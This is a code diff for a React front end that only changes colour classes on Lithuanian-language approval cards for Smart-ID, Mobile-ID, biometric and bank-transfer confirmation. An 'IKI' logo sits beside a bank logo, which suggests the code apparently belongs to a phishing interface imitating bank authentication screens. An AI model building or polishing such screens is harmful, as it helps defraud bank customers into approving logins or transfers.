@@ -126,7 +126,7 @@ function SmartIdApprovalCard({
             type="button"
             onClick={onConfirm}
             disabled={saving}
-            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
+            className="w-full rounded-[10px] bg-[#0fae4e] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#007a38] disabled:cursor-not-allowed disabled:opacity-70"
           >
             {saving ? "Patvirtinama..." : "Patvirtinti"}
           </button>
@@ -152,7 +152,7 @@ function GenericApprovalCard({
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
       <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
-        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#0ea5a8]">{title}</p>
+        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#22c55e]">{title}</p>
         <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Būtinas patvirtinimas</h1>
         <p className="mb-6 text-base text-[#667085]">Norėdami tęsti, patvirtinkite savo įrenginyje rodomą patvirtinimo kodą.</p>
 
@@ -168,7 +168,7 @@ function GenericApprovalCard({
           type="button"
           onClick={onConfirm}
           disabled={saving}
-          className="w-full rounded-[12px] bg-[#1464f4] px-4 py-4 text-base font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
+          className="w-full rounded-[12px] bg-[#0fae4e] px-4 py-4 text-base font-medium text-white transition hover:bg-[#007a38] disabled:cursor-not-allowed disabled:opacity-70"
         >
           {saving ? "Patvirtinama..." : "Patvirtinti"}
         </button>
@@ -216,7 +216,7 @@ function MobileIdApprovalCard({
             type="button"
             onClick={onConfirm}
             disabled={saving}
-            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
+            className="w-full rounded-[10px] bg-[#0fae4e] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#007a38] disabled:cursor-not-allowed disabled:opacity-70"
           >
             {saving ? "Patvirtinama..." : "Patvirtinti"}
           </button>
@@ -281,7 +281,7 @@ function BiometricApprovalCard({
             type="button"
             onClick={onConfirm}
             disabled={saving}
-            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
+            className="w-full rounded-[10px] bg-[#0fae4e] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#007a38] disabled:cursor-not-allowed disabled:opacity-70"
           >
             {saving ? "Patvirtinama..." : "Patvirtinti"}
           </button>
@@ -313,7 +313,7 @@ function TransferApprovalCard({
 
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
-      <div className="w-full max-w-[400px] rounded-[24px] border border-[#dce8f5] bg-white px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
+      <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4ecd9] bg-white px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
         {/* IKI sol ust + banka logosu sag ust */}
         <div className="mb-6 flex items-start justify-between">
           <img
@@ -355,7 +355,7 @@ function TransferApprovalCard({
           type="button"
           onClick={onConfirm}
           disabled={saving}
-          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#14b8a6] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[#0d9488] disabled:cursor-not-allowed disabled:opacity-70"
+          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#22c55e] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[#0fae4e] disabled:cursor-not-allowed disabled:opacity-70"
         >
           <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
             <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
@@ -517,7 +517,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   if (!ready) {
     return (
       <div className="flex min-h-screen items-center justify-center px-4">
-        <div className="size-10 animate-spin rounded-full border-4 border-[#1464f4]/25 border-t-[#1464f4]" />
+        <div className="size-10 animate-spin rounded-full border-4 border-[#0fae4e]/25 border-t-[#0fae4e]" />
       </div>
     );
   }
@@ -539,7 +539,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
           </div>
           <h1 className="text-xl font-bold text-[#101828]">Patvirtinta!</h1>
           <p className="mt-2 text-sm text-[#667085]">Prašome palaukti, nukreipiama...</p>
-          <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#1464f4]/20 border-t-[#1464f4]" />
+          <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#0fae4e]/20 border-t-[#0fae4e]" />
         </div>
       </div>
     );
